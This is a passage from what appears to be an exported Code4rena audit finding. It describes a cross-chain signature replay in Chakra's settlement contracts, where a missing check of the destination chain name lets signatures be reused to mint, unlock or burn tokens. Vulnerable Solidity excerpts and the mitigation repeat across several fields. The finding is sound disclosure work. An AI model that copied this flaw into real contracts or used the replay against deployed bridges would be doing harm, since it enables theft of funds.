is possible that the validators have the same addresses on two different `to_chain` chains while the number of required validators are the same on both chains, and the handler has the same address on these two `to_chain` chains as well. Moreover, such handler can whitelist the same `from_chain`-`from_handler` combination on both `to_chain` chains.\n\nSuppose such situation occurs for `to_chain` A and B, the validators on `to_chain` A can sign for a cross-chain message in which such signatures should only be used on `to_chain` A and should not be allowed to be used on `to_chain` B. However, since the `ChakraSettlement.receive_cross_chain_msg` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` corresponding to its `txid` input, the `ChakraSettlement.receive_cross_chain_msg` function on `to_chain` B can be successfully called with the `txid`, `from_chain`, `from_address`, `from_handler`, `to_handler`, and `payload`, which were encoded in the signed message hash for the signatures that should only be used on `to_chain` A.\n\nIn this case:\n- `signature_verifier.verify(message_hash, signatures, sign_type)` would return `true` because the corresponding validators, which signed the signatures for `to_chain` A, have the same addresses on both `to_chain` A and B, and both chains have the same number of required validators;\n- `ISettlementHandler(to_handler).receive_cross_chain_msg` would be called successfully because the corresponding `to_handler` that is encoded for the signatures to be used on `to_chain` A also exists on `to_chain` B with the same address;\n- `is_valid_handler(from_chain, from_handler)` would be `true` when further calling the `ChakraSettlementHandler.receive_cross_chain_msg` function because the `from_chain`-`from_handler` combination that is encoded for the signatures to be used on `to_chain` A is also whitelisted by such `to_handler` on `to_chain` B.\n\nThus, such `ChakraSettlement.receive_cross_chain_msg` function call on `to_chain` B would be successful, which causes such signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_msg` function on `to_chain` A to also be allowed to be used on `to_chain` B.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\n```solidity\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        {\n            // verify signature\n@>          bytes32 message_hash = keccak256(\n@>              abi.encodePacked(\n@>                  txid,\n@>                  from_chain,\n@>                  from_address,\n@>                  from_handler,\n@>                  to_handler,\n@>                  keccak256(payload)\n@>              )\n@>          );\n\n@>          require(\n@>              signature_verifier.verify(message_hash, signatures, sign_type),\n@>              \"Invalid signature\"\n@>          );\n\n            require(\n                receive_cross_txs[txid].status == CrossChainMsgStatus.Unknow,\n                \"Invalid transaction status\"\n            );\n        }\n\n        receive_cross_txs[txid] = ReceivedCrossChainTx(\n            txid,\n            from_chain,\n            contract_chain_name,\n            from_address,\n            from_handler,\n            address(this),\n            payload,\n            CrossChainMsgStatus.Pending\n        );\n\n@>      bool result = ISettlementHandler(to_handler).receive_cross_chain_msg(\n            txid,\n            from_chain,\n            from_address,\n            from_handler,\n            payload_type,\n            payload,\n            sign_type,\n            signatures\n        );\n\n        CrossChainMsgStatus status = CrossChainMsgStatus.Failed;\n        if (result == true) {\n            status = CrossChainMsgStatus.Success;\n            receive_cross_txs[txid].status = CrossChainMsgStatus.Success;\n        } else {\n            receive_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name,\n            from_chain,\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\n```solidity\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n@>      if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n        bytes calldata msg_payload = MessageV1Codec.payload(payload);\n\n        require(isValidPayloadType(payload_type), \"Invalid payload type\");\n\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\n\nSimilarly, when the same situation occurs for `to_chain` A and B, the `ChakraSettlement.receive_cross_chain_callback` function on `to_chain` B can also be successfully called with the `txid`, `from_handler`, `to_handler`, and `status`, which were encoded in the signed message hash for the signatures that should only be used on `to_chain` A, because the `ChakraSettlement.receive_cross_chain_callback` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` associated with its `txid` input.\n\nFor the same reasons described for the case involving the `ChakraSettlement.receive_cross_chain_msg` function, calling the `ChakraSettlement.receive_cross_chain_callback` function in this case would cause `signature_verifier.verify(message_hash, signatures, sign_type)` to return `true`, `ISettlementHandler(to_handler).receive_cross_chain_callback` to be called successfully, and `is_valid_handler(from_chain, from_handler)` to be `true` when further calling the `ChakraSettlementHandler.processCrossChainCallback` function. Hence, such `ChakraSettlement.receive_cross_chain_callback` function call on `to_chain` B would be successful, which causes such signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_callback` function on `to_chain` A to also be allowed to be used on `to_chain` B.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L256-L283\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) external {\n@>      verifySignature(\n            txid,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n@>      processCrossChainCallback(\n            txid,\n            from_chain,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        emitCrossChainResult(txid);\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L285-L301\n```solidity\n    function verifySignature(\n        uint256 txid,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal view {\n        bytes32 message_hash = keccak256(\n@>          abi.encodePacked(txid, from_handler, to_handler, status)\n        );\n\n        require(\n@>          signature_verifier.verify(message_hash, signatures, sign_type),\n            \"Invalid signature\"\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\n```solidity\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n@>          ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n@>      if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n\n        require(\n            create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n            \"invalid CrossChainTxStatus\"\n        );\n\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n        if (status == CrossChainMsgStatus.Failed) {\n            create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n\n        return true;\n    }\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nThe `ChakraSettlement.receive_cross_chain_msg` and `ChakraSettlement.receive_cross_chain_callback` functions can be updated to check if the receiving `ChakraSettlement` contract's `contract_chain_name` matches the `to_chain` associated with the respective `txid` input and revert if not matched.\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\nBecause the `ChakraSettlement.receive_cross_chain_msg` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` corresponding to its `txid` input, the signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_msg` function on `to_chain` A can also be allowed to be used on `to_chain` B. As a result, the handler on `to_chain` B can incorrectly mint or transfer tokens to recipients though such recipients should only receive such token amounts on `to_chain` A and not on `to_chain` B.\n\nSimilarly, since the `ChakraSettlement.receive_cross_chain_callback` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` associated with its `txid` input, the signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_callback` function on `to_chain` A can also be allowed to be used on `to_chain` B. As a result, `to_chain` B's handler's `receive_cross_chain_callback` function logics can be incorrectly triggered, such as burning the corresponding token amount held by such handler on `to_chain` B under the `MintBurn` mode though such token amount should only be burned on `to_chain` A and not on `to_chain` B.\n", "recommendation_md": "## Recommended Mitigation Steps\nThe `ChakraSettlement.receive_cross_chain_msg` and `ChakraSettlement.receive_cross_chain_callback` functions can be updated to check if the receiving `ChakraSettlement` contract's `contract_chain_name` matches the `to_chain` associated with the respective `txid` input and revert if not matched.\n\n\n## Assessed type\n\nOther\n", "poc_md": "## Proof of Concept\nWhen a validator is deterministically deployed, it can have the same address on different chains. When a handler is deterministically deployed, it can have the same address on different chains. Therefore, it is possible that the validators have the same addresses on two different `to_chain` chains while the number of required validators are the same on both chains, and the handler has the same address on these two `to_chain` chains as well. Moreover, such handler can whitelist the same `from_chain`-`from_handler` combination on both `to_chain` chains.\n\nSuppose such situation occurs for `to_chain` A and B, the validators on `to_chain` A can sign for a cross-chain message in which such signatures should only be used on `to_chain` A and should not be allowed to be used on `to_chain` B. However, since the `ChakraSettlement.receive_cross_chain_msg` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` corresponding to its `txid` input, the `ChakraSettlement.receive_cross_chain_msg` function on `to_chain` B can be successfully called with the `txid`, `from_chain`, `from_address`, `from_handler`, `to_handler`, and `payload`, which were encoded in the signed message hash for the signatures that should only be used on `to_chain` A.\n\nIn this case:\n- `signature_verifier.verify(message_hash, signatures, sign_type)` would return `true` because the corresponding validators, which signed the signatures for `to_chain` A, have the same addresses on both `to_chain` A and B, and both chains have the same number of required validators;\n- `ISettlementHandler(to_handler).receive_cross_chain_msg` would be called successfully because the corresponding `to_handler` that is encoded for the signatures to be used on `to_chain` A also exists on `to_chain` B with the same address;\n- `is_valid_handler(from_chain, from_handler)` would be `true` when further calling the `ChakraSettlementHandler.receive_cross_chain_msg` function because the `from_chain`-`from_handler` combination that is encoded for the signatures to be used on `to_chain` A is also whitelisted by such `to_handler` on `to_chain` B.\n\nThus, such `ChakraSettlement.receive_cross_chain_msg` function call on `to_chain` B would be successful, which causes such signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_msg` function on `to_chain` A to also be allowed to be used on `to_chain` B.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\n```solidity\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        {\n            // verify signature\n@>          bytes32 message_hash = keccak256(\n@>              abi.encodePacked(\n@>                  txid,\n@>                  from_chain,\n@>                  from_address,\n@>                  from_handler,\n@>                  to_handler,\n@>                  keccak256(payload)\n@>              )\n@>          );\n\n@>          require(\n@>              signature_verifier.verify(message_hash, signatures, sign_type),\n@>              \"Invalid signature\"\n@>          );\n\n            require(\n                receive_cross_txs[txid].status == CrossChainMsgStatus.Unknow,\n                \"Invalid transaction status\"\n            );\n        }\n\n        receive_cross_txs[txid] = ReceivedCrossChainTx(\n            txid,\n            from_chain,\n            contract_chain_name,\n            from_address,\n            from_handler,\n            address(this),\n            payload,\n            CrossChainMsgStatus.Pending\n        );\n\n@>      bool result = ISettlementHandler(to_handler).receive_cross_chain_msg(\n            txid,\n            from_chain,\n            from_address,\n            from_handler,\n            payload_type,\n            payload,\n            sign_type,\n            signatures\n        );\n\n        CrossChainMsgStatus status = CrossChainMsgStatus.Failed;\n        if (result == true) {\n            status = CrossChainMsgStatus.Success;\n            receive_cross_txs[txid].status = CrossChainMsgStatus.Success;\n        } else {\n            receive_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name,\n            from_chain,\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\n```solidity\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n@>      if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n        bytes calldata msg_payload = MessageV1Codec.payload(payload);\n\n        require(isValidPayloadType(payload_type), \"Invalid payload type\");\n\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\n\nSimilarly, when the same situation occurs for `to_chain` A and B, the `ChakraSettlement.receive_cross_chain_callback` function on `to_chain` B can also be successfully called with the `txid`, `from_handler`, `to_handler`, and `status`, which were encoded in the signed message hash for the signatures that should only be used on `to_chain` A, because the `ChakraSettlement.receive_cross_chain_callback` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` associated with its `txid` input.\n\nFor the same reasons described for the case involving the `ChakraSettlement.receive_cross_chain_msg` function, calling the `ChakraSettlement.receive_cross_chain_callback` function in this case would cause `signature_verifier.verify(message_hash, signatures, sign_type)` to return `true`, `ISettlementHandler(to_handler).receive_cross_chain_callback` to be called successfully, and `is_valid_handler(from_chain, from_handler)` to be `true` when further calling the `ChakraSettlementHandler.processCrossChainCallback` function. Hence, such `ChakraSettlement.receive_cross_chain_callback` function call on `to_chain` B would be successful, which causes such signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_callback` function on `to_chain` A to also be allowed to be used on `to_chain` B.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L256-L283\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) external {\n@>      verifySignature(\n            txid,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n@>      processCrossChainCallback(\n            txid,\n            from_chain,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        emitCrossChainResult(txid);\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L285-L301\n```solidity\n    function verifySignature(\n        uint256 txid,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal view {\n        bytes32 message_hash = keccak256(\n@>          abi.encodePacked(txid, from_handler, to_handler, status)\n        );\n\n        require(\n@>          signature_verifier.verify(message_hash, signatures, sign_type),\n            \"Invalid signature\"\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\n```solidity\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n@>          ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n@>      if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n\n        require(\n            create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n            \"invalid CrossChainTxStatus\"\n        );\n\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n        if (status == CrossChainMsgStatus.Failed) {\n            create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n\n        return true;\n    }\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L256-L283\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L285-L301\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L256-L283\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L285-L301\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n\n\n# Vulnerability details\n\n## Impact\nBecause the `ChakraSettlement.receive_cross_chain_msg` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` corresponding to its `txid` input, the signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_msg` function on `to_chain` A can also be allowed to be used on `to_chain` B. As a result, the handler on `to_chain` B can incorrectly mint or transfer tokens to recipients though such recipients should only receive such token amounts on `to_chain` A and not on `to_chain` B.\n\nSimilarly, since the `ChakraSettlement.receive_cross_chain_callback` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` associated with its `txid` input, the signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_callback` function on `to_chain` A can also be allowed to be used on `to_chain` B. As a result, `to_chain` B's handler's `receive_cross_chain_callback` function logics can be incorrectly triggered, such as burning the corresponding token amount held by such handler on `to_chain` B under the `MintBurn` mode though such token amount should only be burned on `to_chain` A and not on `to_chain` B.\n\n## Proof of Concept\nWhen a validator is deterministically deployed, it can have the same address on different chains. When a handler is deterministically deployed, it can have the same address on different chains. Therefore, it is possible that the validators have the same addresses on two different `to_chain` chains while the number of required validators are the same on both chains, and the handler has the same address on these two `to_chain` chains as well. Moreover, such handler can whitelist the same `from_chain`-`from_handler` combination on both `to_chain` chains.\n\nSuppose such situation occurs for `to_chain` A and B, the validators on `to_chain` A can sign for a cross-chain message in which such signatures should only be used on `to_chain` A and should not be allowed to be used on `to_chain` B. However, since the `ChakraSettlement.receive_cross_chain_msg` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` corresponding to its `txid` input, the `ChakraSettlement.receive_cross_chain_msg` function on `to_chain` B can be successfully called with the `txid`, `from_chain`, `from_address`, `from_handler`, `to_handler`, and `payload`, which were encoded in the signed message hash for the signatures that should only be used on `to_chain` A.\n\nIn this case:\n- `signature_verifier.verify(message_hash, signatures, sign_type)` would return `true` because the corresponding validators, which signed the signatures for `to_chain` A, have the same addresses on both `to_chain` A and B, and both chains have the same number of required validators;\n- `ISettlementHandler(to_handler).receive_cross_chain_msg` would be called successfully because the corresponding `to_handler` that is encoded for the signatures to be used on `to_chain` A also exists on `to_chain` B with the same address;\n- `is_valid_handler(from_chain, from_handler)` would be `true` when further calling the `ChakraSettlementHandler.receive_cross_chain_msg` function because the `from_chain`-`from_handler` combination that is encoded for the signatures to be used on `to_chain` A is also whitelisted by such `to_handler` on `to_chain` B.\n\nThus, such `ChakraSettlement.receive_cross_chain_msg` function call on `to_chain` B would be successful, which causes such signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_msg` function on `to_chain` A to also be allowed to be used on `to_chain` B.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\n```solidity\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        {\n            // verify signature\n@>          bytes32 message_hash = keccak256(\n@>              abi.encodePacked(\n@>                  txid,\n@>                  from_chain,\n@>                  from_address,\n@>                  from_handler,\n@>                  to_handler,\n@>                  keccak256(payload)\n@>              )\n@>          );\n\n@>          require(\n@>              signature_verifier.verify(message_hash, signatures, sign_type),\n@>              \"Invalid signature\"\n@>          );\n\n            require(\n                receive_cross_txs[txid].status == CrossChainMsgStatus.Unknow,\n                \"Invalid transaction status\"\n            );\n        }\n\n        receive_cross_txs[txid] = ReceivedCrossChainTx(\n            txid,\n            from_chain,\n            contract_chain_name,\n            from_address,\n            from_handler,\n            address(this),\n            payload,\n            CrossChainMsgStatus.Pending\n        );\n\n@>      bool result = ISettlementHandler(to_handler).receive_cross_chain_msg(\n            txid,\n            from_chain,\n            from_address,\n            from_handler,\n            payload_type,\n            payload,\n            sign_type,\n            signatures\n        );\n\n        CrossChainMsgStatus status = CrossChainMsgStatus.Failed;\n        if (result == true) {\n            status = CrossChainMsgStatus.Success;\n            receive_cross_txs[txid].status = CrossChainMsgStatus.Success;\n        } else {\n            receive_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name,\n            from_chain,\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\n```solidity\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n@>      if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n        bytes calldata msg_payload = MessageV1Codec.payload(payload);\n\n        require(isValidPayloadType(payload_type), \"Invalid payload type\");\n\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\n\nSimilarly, when the same situation occurs for `to_chain` A and B, the `ChakraSettlement.receive_cross_chain_callback` function on `to_chain` B can also be successfully called with the `txid`, `from_handler`, `to_handler`, and `status`, which were encoded in the signed message hash for the signatures that should only be used on `to_chain` A, because the `ChakraSettlement.receive_cross_chain_callback` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` associated with its `txid` input.\n\nFor the same reasons described for the case involving the `ChakraSettlement.receive_cross_chain_msg` function, calling the `ChakraSettlement.receive_cross_chain_callback` function in this case would cause `signature_verifier.verify(message_hash, signatures, sign_type)` to return `true`, `ISettlementHandler(to_handler).receive_cross_chain_callback` to be called successfully, and `is_valid_handler(from_chain, from_handler)` to be `true` when further calling the `ChakraSettlementHandler.processCrossChainCallback` function. Hence, such `ChakraSettlement.receive_cross_chain_callback` function call on `to_chain` B would be successful, which causes such signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_callback` function on `to_chain` A to also be allowed to be used on `to_chain` B.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L256-L283\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address 